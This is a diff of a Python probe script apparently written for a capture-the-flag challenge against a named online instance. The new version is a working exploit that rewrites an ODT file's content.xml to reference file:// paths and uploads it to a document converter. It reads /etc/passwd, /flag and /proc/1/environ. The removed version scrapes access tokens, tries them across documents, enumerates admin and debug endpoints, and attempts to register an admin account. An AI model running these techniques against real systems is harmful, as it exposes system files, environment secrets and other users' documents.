@@ -1,187 +1,52 @@
 #!/usr/bin/env python3
-"""Temporary CTF HTTP probe. No repository secrets are used or sent."""
-import http.cookiejar
-import html
-import html.parser
-import re
-import sys
+"""Temporary CTF converter probe; sends only our crafted ODT to the target."""
+import io
+import pathlib
 import urllib.error
-import urllib.parse
 import urllib.request
+import uuid
+import zipfile
 
 BASE = "http://njwqato3tpdz0t6k.instances.ctfcup.online"
-EMAIL = "arena-93aa1301@corp"
-PASSWORD = "Arena-93aa1301-CTF!"
-NAME = "arena"
-
-jar = http.cookiejar.CookieJar()
-opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
-opener.addheaders = [("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/131 Safari/537.36")]
+POC = pathlib.Path(__file__).with_name("poc.odt")
 
 
-class FormParser(html.parser.HTMLParser):
-    def __init__(self):
-        super().__init__()
-        self.forms = []
-        self.assets = []
-        self.links = []
-        self._form = None
-
-    def handle_starttag(self, tag, attrs):
-        a = dict(attrs)
-        if tag == "form":
-            self._form = {"action": a.get("action", ""), "method": a.get("method", "get"), "inputs": []}
-            self.forms.append(self._form)
-        elif tag in ("input", "textarea", "select") and self._form is not None:
-            self._form["inputs"].append({"tag": tag, **a})
-        elif tag == "script" and a.get("src"):
-            self.assets.append(a["src"])
-        elif tag == "link" and a.get("href"):
-            self.assets.append(a["href"])
-        elif tag == "a" and a.get("href"):
-            self.links.append(a["href"])
-
-    def handle_endtag(self, tag):
-        if tag == "form":
-            self._form = None
+def payload(target):
+    source = io.BytesIO(POC.read_bytes())
+    out = io.BytesIO()
+    with zipfile.ZipFile(source) as zin, zipfile.ZipFile(out, "w") as zout:
+        for info in zin.infolist():
+            data = zin.read(info.filename)
+            if info.filename == "content.xml":
+                data = data.replace(b"file:///etc/passwd", b"file://" + target.encode())
+            zout.writestr(info, data)
+    return out.getvalue()
 
 
-def request(path, data=None, max_body=120000):
-    url = urllib.parse.urljoin(BASE + "/", path)
-    print("\n" + "=" * 30, "REQUEST", data and "POST" or "GET", url, flush=True)
-    if data is not None:
-        print("FORM", {k: ("<redacted>" if "pass" in k.lower() else v) for k, v in data.items()}, flush=True)
-        data = urllib.parse.urlencode(data).encode()
+def convert(target, fmt="txt"):
+    data = payload(target)
+    boundary = "----Arena" + uuid.uuid4().hex
+    body = (
+        f"--{boundary}\r\n"
+        'Content-Disposition: form-data; name="data"; filename="probe.odt"\r\n'
+        "Content-Type: application/vnd.oasis.opendocument.text\r\n\r\n"
+    ).encode() + data + f"\r\n--{boundary}--\r\n".encode()
+    url = BASE + "/cool/convert-to/" + fmt
+    req = urllib.request.Request(url, data=body, method="POST")
+    req.add_header("Content-Type", "multipart/form-data; boundary=" + boundary)
+    req.add_header("Content-Length", str(len(body)))
+    req.add_header("User-Agent", "Mozilla/5.0")
+    print("\n" + "=" * 25, "CONVERT", target, "TO", fmt, "BYTES", len(data), flush=True)
     try:
-        with opener.open(url, data=data, timeout=30) as r:
-            raw = r.read(max_body)
-            text = raw.decode("utf-8", "replace")
-            print("STATUS", r.status, "FINAL", r.url, flush=True)
-            print("HEADERS\n" + str(r.headers), flush=True)
-            shown = re.sub(r"<style\b[^>]*>.*?</style>", "<style>/* omitted */</style>", text, flags=re.S | re.I)
-            print("BODY\n" + shown, flush=True)
-            print("COOKIES", [(c.name, c.value) for c in jar], flush=True)
-            return text, r.url
+        with urllib.request.urlopen(req, timeout=90) as r:
+            raw = r.read(500000)
+            print("STATUS", r.status, "HEADERS", r.headers, flush=True)
+            print("RESPONSE", raw.decode("utf-8", "replace"), flush=True)
     except urllib.error.HTTPError as e:
-        text = e.read(max_body).decode("utf-8", "replace")
-        print("HTTP ERROR", e.code, e.headers, text, flush=True)
-        return text, e.url
+        print("HTTP ERROR", e.code, e.headers, e.read(200000).decode("utf-8", "replace"), flush=True)
     except Exception as e:
         print("ERROR", repr(e), flush=True)
-        return "", url
 
 
-def parse(text):
-    p = FormParser()
-    p.feed(text)
-    print("PARSED", {"forms": p.forms, "assets": p.assets, "links": p.links}, flush=True)
-    return p
-
-
-def submit_form(path, login=False):
-    text, _ = request(path)
-    p = parse(text)
-    if not p.forms:
-        return
-    form = p.forms[0]
-    fields = {}
-    for i in form["inputs"]:
-        name = i.get("name")
-        if not name:
-            continue
-        typ = i.get("type", "text").lower()
-        if typ == "hidden":
-            fields[name] = i.get("value", "")
-        elif typ == "email" or "mail" in name.lower() or "login" in name.lower():
-            fields[name] = EMAIL
-        elif typ == "password" or "pass" in name.lower():
-            fields[name] = PASSWORD
-        elif typ not in ("submit", "button", "checkbox", "radio"):
-            fields[name] = NAME
-    action = form["action"] or path
-    if form["method"].lower() == "post":
-        text, _ = request(action, fields)
-        parse(text)
-    else:
-        print("Form is not POST; fields inferred:", fields, flush=True)
-
-
-# Registration is idempotent for this fixed CTF account: on later runs the
-# subsequent login simply uses the account created by the first run.
-submit_form("/register")
-login_text, _ = request("/login", max_body=50000)
-p = parse(login_text)
-if p.forms:
-    form = p.forms[0]
-    fields = {}
-    for i in form["inputs"]:
-        n = i.get("name")
-        if not n:
-            continue
-        typ = i.get("type", "text").lower()
-        if typ == "hidden":
-            fields[n] = i.get("value", "")
-        elif typ == "email" or "mail" in n.lower() or "login" in n.lower():
-            fields[n] = EMAIL
-        elif typ == "password" or "pass" in n.lower():
-            fields[n] = PASSWORD
-    if form["method"].lower() == "post":
-        text, final = request(form["action"] or "/login", fields)
-        parse(text)
-
-def editor_token(docid):
-    editor, _ = request("/edit/" + docid, max_body=70000)
-    match = re.search(r'<iframe[^>]+src=["\']([^"\']+)', editor, re.I)
-    if not match:
-        return ""
-    iframe = html.unescape(match.group(1))
-    query = urllib.parse.parse_qs(urllib.parse.urlsplit(iframe).query)
-    token = query.get("access_token", [""])[0]
-    print("TOKEN_FOR", docid, token, flush=True)
-    return token
-
-
-home, _ = request("/", max_body=90000)
-parse(home)
-created, final = request("/docs/create", {"folder": "", "title": "second-<b>probe</b>"}, max_body=70000)
-print("SECOND_DOC", final, flush=True)
-tokens = {"d1": editor_token("d1"), "d2": editor_token("d2")}
-for token_owner, token in tokens.items():
-    if not token:
-        continue
-    for docid in ("d0", "d1", "d2", "d3", "flag"):
-        path = "/wopi/files/" + docid + "?access_token=" + urllib.parse.quote(token)
-        print("CROSS_TOKEN", token_owner, "->", docid, flush=True)
-        request(path, max_body=15000)
-
-for path in (
-    "/hosting/discovery", "/hosting/capabilities", "/cool/convert-to",
-    "/metrics", "/debug/pprof/", "/debug/pprof/cmdline", "/admin",
-    "/flag", "/flag.txt", "/internal/flag", "/health", "/api",
-):
-    request(path, max_body=50000)
-
-# Determine whether the obvious privileged account already exists. A 409 means
-# it does; successful registration would instead give us that account directly.
-jar.clear()
-EMAIL = "admin@corp"
-PASSWORD = "Arena-Admin-93aa1301!"
-NAME = "admin"
-submit_form("/register")
-login_text, _ = request("/login", max_body=30000)
-p = parse(login_text)
-if p.forms:
-    form = p.forms[0]
-    fields = {}
-    for i in form["inputs"]:
-        n = i.get("name")
-        if not n:
-            continue
-        if i.get("type") == "hidden":
-            fields[n] = i.get("value", "")
-        elif n == "email":
-            fields[n] = EMAIL
-        elif n == "password":
-            fields[n] = PASSWORD
-    request(form["action"] or "/login", fields, max_body=50000)
-request("/", max_body=50000)
+for path in ("/etc/passwd", "/flag", "/flag.txt", "/proc/1/environ"):
+    convert(path)
